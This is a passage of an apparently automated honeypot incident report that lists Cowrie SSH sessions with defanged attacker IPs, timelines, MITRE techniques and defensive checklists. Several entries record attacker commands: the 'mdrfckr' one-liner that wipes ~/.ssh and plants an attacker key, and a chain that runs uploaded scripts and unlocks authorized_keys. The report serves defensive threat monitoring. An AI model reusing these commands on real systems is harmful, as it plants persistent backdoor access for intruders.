| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:18:39` | `cowrie.session.connect` |
| `2026-08-16 15:18:39` | `cowrie.client.version` |
| `2026-08-16 15:18:39` | `cowrie.client.kex` |
| `2026-08-16 15:18:39` | `cowrie.login.success` |
| `2026-08-16 15:18:40` | `cowrie.session.params` |
| `2026-08-16 15:18:40` | `cowrie.command.input` |
| `2026-08-16 15:18:41` | `cowrie.log.closed` |
| `2026-08-16 15:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f8308c98707

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]9` |
| **First Seen** | 2026-08-16 15:29 |
| **Last Seen** | 2026-08-16 15:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:29:52` | `cowrie.session.connect` |
| `2026-08-16 15:29:53` | `cowrie.client.version` |
| `2026-08-16 15:29:53` | `cowrie.client.kex` |
| `2026-08-16 15:29:55` | `cowrie.login.success` |
| `2026-08-16 15:29:56` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:30:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]9` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d8ec7968af

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 15:35 |
| **Last Seen** | 2026-08-16 15:36 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:35:25` | `cowrie.session.connect` |
| `2026-08-16 15:35:30` | `cowrie.client.version` |
| `2026-08-16 15:35:30` | `cowrie.client.kex` |
| `2026-08-16 15:35:54` | `cowrie.login.success` |
| `2026-08-16 15:36:06` | `cowrie.session.params` |
| `2026-08-16 15:36:06` | `cowrie.command.input` |
| `2026-08-16 15:36:11` | `cowrie.log.closed` |
| `2026-08-16 15:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fbe3821041e

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-16 15:35 |
| **Last Seen** | 2026-08-16 15:35 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:35:41` | `cowrie.session.connect` |
| `2026-08-16 15:35:43` | `cowrie.client.version` |
| `2026-08-16 15:35:43` | `cowrie.client.kex` |
| `2026-08-16 15:35:51` | `cowrie.login.success` |
| `2026-08-16 15:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2287eab016a5

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-16 15:35 |
| **Last Seen** | 2026-08-16 15:36 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:35:55` | `cowrie.session.connect` |
| `2026-08-16 15:35:55` | `cowrie.client.version` |
| `2026-08-16 15:35:56` | `cowrie.client.kex` |
| `2026-08-16 15:35:56` | `cowrie.login.success` |
| `2026-08-16 15:36:31` | `cowrie.session.params` |
| `2026-08-16 15:36:31` | `cowrie.command.input` |
| `2026-08-16 15:36:31` | `cowrie.log.closed` |
| `2026-08-16 15:36:31` | `cowrie.session.file_upload` |
| `2026-08-16 15:36:31` | `cowrie.session.file_upload` |
| `2026-08-16 15:36:31` | `cowrie.session.file_upload` |
| `2026-08-16 15:36:31` | `cowrie.session.file_upload` |
| `2026-08-16 15:36:31` | `cowrie.session.file_upload` |
| `2026-08-16 15:36:31` | `cowrie.session.file_upload` |
| `2026-08-16 15:36:31` | `cowrie.session.file_upload` |
| `2026-08-16 15:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8cdd07f6fc8

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 15:37 |
| **Last Seen** | 2026-08-16 15:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:37:45` | `cowrie.session.connect` |
| `2026-08-16 15:37:45` | `cowrie.client.version` |
| `2026-08-16 15:37:45` | `cowrie.client.kex` |
| `2026-08-16 15:37:46` | `cowrie.login.success` |
| `2026-08-16 15:37:47` | `cowrie.session.params` |
| `2026-08-16 15:37:47` | `cowrie.command.input` |
| `2026-08-16 15:37:47` | `cowrie.log.closed` |
| `2026-08-16 15:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-629a0fe02a66

| Field | Detail |
|---|---|
| **Source IP** | `122.165.72[.]15` |
| **First Seen** | 2026-08-16 15:43 |
| **Last Seen** | 2026-08-16 15:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:43:42` | `cowrie.session.connect` |
| `2026-08-16 15:43:43` | `cowrie.client.version` |
| `2026-08-16 15:43:43` | `cowrie.client.kex` |
| `2026-08-16 15:43:45` | `cowrie.login.success` |
| `2026-08-16 15:43:46` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.165.72[.]15` to AbuseIPDB if not already reported
- [ ] Block `122.165.72[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b79ca664ad

| Field | Detail |
|---|---|
| **Source IP** | `113.193.187[.]154` |
| **First Seen** | 2026-08-16 15:43 |
| **Last Seen** | 2026-08-16 15:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:43:51` | `cowrie.session.connect` |
| `2026-08-16 15:43:52` | `cowrie.client.version` |
| `2026-08-16 15:43:52` | `cowrie.client.kex` |
| `2026-08-16 15:43:54` | `cowrie.login.success` |
| `2026-08-16 15:43:55` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.193.187[.]154` to AbuseIPDB if not already reported
- [ ] Block `113.193.187[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-603975b56a58

| Field | Detail |
|---|---|
| **Source IP** | `117.241.77[.]78` |
| **First Seen** | 2026-08-16 15:47 |
| **Last Seen** | 2026-08-16 15:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:47:43` | `cowrie.session.connect` |
| `2026-08-16 15:47:44` | `cowrie.client.version` |
| `2026-08-16 15:47:44` | `cowrie.client.kex` |
| `2026-08-16 15:47:47` | `cowrie.login.success` |
| `2026-08-16 15:47:48` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:47:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.241.77[.]78` to AbuseIPDB if not already reported
- [ ] Block `117.241.77[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9c83091c17f

| Field | Detail |
|---|---|
| **Source IP** | `65.20.153[.]146` |
| **First Seen** | 2026-08-16 15:47 |
| **Last Seen** | 2026-08-16 15:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:47:58` | `cowrie.session.connect` |
| `2026-08-16 15:47:58` | `cowrie.client.version` |
| `2026-08-16 15:47:58` | `cowrie.client.kex` |
| `2026-08-16 15:48:00` | `cowrie.login.success` |
| `2026-08-16 15:48:00` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:48:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.153[.]146` to AbuseIPDB if not already reported
- [ ] Block `65.20.153[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-185e85d2336b

| Field | Detail |
|---|---|
| **Source IP** | `113.200.216[.]246` |
| **First Seen** | 2026-08-16 15:48 |
| **Last Seen** | 2026-08-16 15:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:48:39` | `cowrie.session.connect` |
| `2026-08-16 15:48:41` | `cowrie.client.version` |
| `2026-08-16 15:48:41` | `cowrie.client.kex` |
| `2026-08-16 15:48:44` | `cowrie.login.success` |
| `2026-08-16 15:48:44` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.200.216[.]246` to AbuseIPDB if not already reported
- [ ] Block `113.200.216[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23b4bde11008

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-08-16 15:48 |
| **Last Seen** | 2026-08-16 15:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:48:47` | `cowrie.session.connect` |
| `2026-08-16 15:48:47` | `cowrie.client.version` |
| `2026-08-16 15:48:47` | `cowrie.client.kex` |
| `2026-08-16 15:48:48` | `cowrie.login.success` |
| `2026-08-16 15:48:48` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47b54425af5c

| Field | Detail |
|---|---|
| **Source IP** | `62.220.104[.]155` |
| **First Seen** | 2026-08-16 15:48 |
| **Last Seen** | 2026-08-16 15:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:48:47` | `cowrie.session.connect` |
| `2026-08-16 15:48:48` | `cowrie.client.version` |
| `2026-08-16 15:48:48` | `cowrie.client.kex` |
| `2026-08-16 15:48:49` | `cowrie.login.success` |
| `2026-08-16 15:48:49` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.220.104[.]155` to AbuseIPDB if not already reported
- [ ] Block `62.220.104[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b073bc0035e

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-08-16 15:48 |
| **Last Seen** | 2026-08-16 15:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:48:50` | `cowrie.session.connect` |
| `2026-08-16 15:48:50` | `cowrie.client.version` |
| `2026-08-16 15:48:50` | `cowrie.client.kex` |
| `2026-08-16 15:48:52` | `cowrie.login.success` |
| `2026-08-16 15:48:52` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bc9b73b08db

| Field | Detail |
|---|---|
| **Source IP** | `91.144.158[.]62` |
| **First Seen** | 2026-08-16 15:48 |
| **Last Seen** | 2026-08-16 15:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:48:53` | `cowrie.session.connect` |
| `2026-08-16 15:48:54` | `cowrie.client.version` |
| `2026-08-16 15:48:54` | `cowrie.client.kex` |
| `2026-08-16 15:48:55` | `cowrie.login.success` |
| `2026-08-16 15:48:55` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.144.158[.]62` to AbuseIPDB if not already reported
- [ ] Block `91.144.158[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d29850af397

| Field | Detail |
|---|---|
| **Source IP** | `122.160.142[.]194` |
| **First Seen** | 2026-08-16 15:48 |
| **Last Seen** | 2026-08-16 15:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:48:59` | `cowrie.session.connect` |
| `2026-08-16 15:49:00` | `cowrie.client.version` |
| `2026-08-16 15:49:00` | `cowrie.client.kex` |
| `2026-08-16 15:49:03` | `cowrie.login.success` |
| `2026-08-16 15:49:03` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.142[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.160.142[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14ebcb6d091d

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 15:56 |
| **Last Seen** | 2026-08-16 15:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:56:52` | `cowrie.session.connect` |
| `2026-08-16 15:56:52` | `cowrie.client.version` |
| `2026-08-16 15:56:52` | `cowrie.client.kex` |
| `2026-08-16 15:56:53` | `cowrie.login.success` |
| `2026-08-16 15:56:54` | `cowrie.session.params` |
| `2026-08-16 15:56:54` | `cowrie.command.input` |
| `2026-08-16 15:56:54` | `cowrie.log.closed` |
| `2026-08-16 15:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f8df7b0d77

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 15:57 |
| **Last Seen** | 2026-08-16 15:58 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:57:14` | `cowrie.session.connect` |
| `2026-08-16 15:57:20` | `cowrie.client.version` |
| `2026-08-16 15:57:20` | `cowrie.client.kex` |
| `2026-08-16 15:57:41` | `cowrie.login.success` |
| `2026-08-16 15:57:53` | `cowrie.session.params` |
| `2026-08-16 15:57:53` | `cowrie.command.input` |
| `2026-08-16 15:58:00` | `cowrie.log.closed` |
| `2026-08-16 15:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-235eec363840

| Field | Detail |
|---|---|
| **Source IP** | `208.109.38[.]143` |
| **First Seen** | 2026-08-16 16:03 |
| **Last Seen** | 2026-08-16 16:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:03:53` | `cowrie.session.connect` |
| `2026-08-16 16:03:54` | `cowrie.client.version` |
| `2026-08-16 16:03:54` | `cowrie.client.kex` |
| `2026-08-16 16:03:55` | `cowrie.login.success` |
| `2026-08-16 16:03:56` | `cowrie.direct-tcpip.request` |
| `2026-08-16 16:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.109.38[.]143` to AbuseIPDB if not already reported
- [ ] Block `208.109.38[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cff3118eb504

| Field | Detail |
|---|---|
| **Source IP** | `189.190.217[.]141` |
| **First Seen** | 2026-08-16 16:05 |
| **Last Seen** | 2026-08-16 16:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:05:33` | `cowrie.session.connect` |
| `2026-08-16 16:05:33` | `cowrie.client.version` |
| `2026-08-16 16:05:33` | `cowrie.client.kex` |
| `2026-08-16 16:05:33` | `cowrie.login.success` |
| `2026-08-16 16:05:34` | `cowrie.session.params` |
| `2026-08-16 16:05:34` | `cowrie.command.input` |
| `2026-08-16 16:05:34` | `cowrie.command.failed` |
| `2026-08-16 16:05:34` | `cowrie.log.closed` |
| `2026-08-16 16:05:35` | `cowrie.session.params` |
| `2026-08-16 16:05:35` | `cowrie.command.input` |
| `2026-08-16 16:05:35` | `cowrie.session.file_download` |
| `2026-08-16 16:05:35` | `cowrie.log.closed` |
| `2026-08-16 16:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.190.217[.]141` to AbuseIPDB if not already reported
- [ ] Block `189.190.217[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6dca4e43383

| Field | Detail |
|---|---|
| **Source IP** | `189.190.217[.]141` |
| **First Seen** | 2026-08-16 16:05 |
| **Last Seen** | 2026-08-16 16:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:05:35` | `cowrie.session.connect` |
| `2026-08-16 16:05:35` | `cowrie.client.version` |
| `2026-08-16 16:05:35` | `cowrie.client.kex` |
| `2026-08-16 16:05:35` | `cowrie.login.success` |
| `2026-08-16 16:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.190.217[.]141` to AbuseIPDB if not already reported
- [ ] Block `189.190.217[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c9f9ee318a7

| Field | Detail |
|---|---|
| **Source IP** | `189.190.217[.]141` |
| **First Seen** | 2026-08-16 16:05 |
| **Last Seen** | 2026-08-16 16:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:05:35` | `cowrie.session.connect` |
| `2026-08-16 16:05:35` | `cowrie.client.version` |
| `2026-08-16 16:05:35` | `cowrie.client.kex` |
| `2026-08-16 16:05:36` | `cowrie.login.success` |
| `2026-08-16 16:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.190.217[.]141` to AbuseIPDB if not already reported
- [ ] Block `189.190.217[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1a2bfc78268

| Field | Detail |
|---|---|
| **Source IP** | `190.6.32[.]107` |
| **First Seen** | 2026-08-16 16:07 |
| **Last Seen** | 2026-08-16 16:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 16:07:05` | `cowrie.session.connect` |
| `2026-08-16 16:07:05` | `cowrie.client.version` |
| `2026-08-16 16:07:05` | `cowrie.client.kex` |
| `2026-08-16 16:07:05` | `cowrie.login.success` |
| `2026-08-16 16:07:06` | `cowrie.session.params` |
| `2026-08-16 16:07:06` | `cowrie.command.input` |
| `2026-08-16 16:07:06` | `cowrie.command.failed` |
| `2026-08-16 16:07:06` | `cowrie.log.closed` |
| `2026-08-16 16:07:07` | `cowrie.session.params` |
| `2026-08-16 16:07:07` | `cowrie.command.input` |
| `2026-08-16 16:07:07` | `cowrie.session.file_download` |
| `2026-08-16 16:07:07` | `cowrie.log.closed` |
| `2026-08-16 16:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.6.32[.]107` to AbuseIPDB if not already reported
- [ ] Block `190.6.32[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0ecaa3c1216

| Field | Detail |
|---|---|
